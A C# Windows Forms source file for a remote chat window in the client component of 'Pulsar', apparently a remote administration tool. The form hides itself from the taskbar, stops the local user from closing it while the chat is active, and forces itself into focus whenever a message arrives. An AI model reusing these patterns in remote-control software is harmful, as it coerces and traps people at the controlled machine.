using Pulsar.Common.Messages.UserSupport.RemoteChat;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Client
{
    public partial class FrmRemoteChat : Form
    {
        [DllImport("user32.dll")]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr lpdwProcessId);

        [DllImport("user32.dll")]
        static extern bool SetForegroundWindow(IntPtr hWnd);
        [DllImport("user32.dll")]
        public static extern bool BringWindowToTop(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);

        [DllImport("Kernel32.dll")]
        public static extern uint GetCurrentThreadId();
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        private ISender _connectedClient;
        public bool Active;

        public FrmRemoteChat(ISender client)
        {

            this._connectedClient = client;
            InitializeComponent();
            Active = true;
            txtMessage.KeyDown += new KeyEventHandler(txtMessage_KeyDown); // Subscribe to the KeyDown event

        }
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }


        public void AddMessage(string sender, string message)
        {
            txtMessages.AppendText(string.Format("{0} {1}: {2}{3}", DateTime.Now.ToString("HH:mm:ss"), sender, message, Environment.NewLine));
            ForceFocus();

        }

        private void FrmRemoteChat_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (Active)
                e.Cancel = true;
        }
        public void ForceFocus()
        {
            var fThread = GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero);
            var cThread = GetCurrentThreadId();
            if (fThread != cThread)
            {
                AttachThreadInput(fThread, cThread, true);
                BringWindowToTop(Handle);
                AttachThreadInput(fThread, cThread, false);
            }
            else BringWindowToTop(Handle);
            txtMessage.Focus();
        }
        private void FrmRemoteChat_Shown(object sender, EventArgs e)
        {
            txtMessage.Focus();
        }

        public string sendlol()
        {
            return txtMessage.Text.Trim();
        }
        public void SendMessageServer(ISender connectedClient, string message)
        {
            connectedClient.Send(new GetChat { Message = message });
        }


        private void txtMessage_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.SuppressKeyPress = true; // Prevents the ding sound on pressing enter
                Sendpacket_Click(this, new EventArgs()); // Call the Send method
            }
        }

        private void Sendpacket_Click(object sender, EventArgs e)
        {
            try
            {
                if (txtMessage.Text.Trim() != "")
                {
                    SendMessageServer(_connectedClient, txtMessage.Text.Trim());
                    AddMessage("Me", txtMessage.Text.Trim());
                    txtMessage.Text = "";
                    txtMessage.Focus();
                }
            }
            catch (Exception ex)
            {
            
            }
        }

        private void FrmRemoteChat_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                SendMessageServer(_connectedClient, "Chat has been ended.");
            }
            catch (Exception ex)
            {
            
            }
        }
    }
}
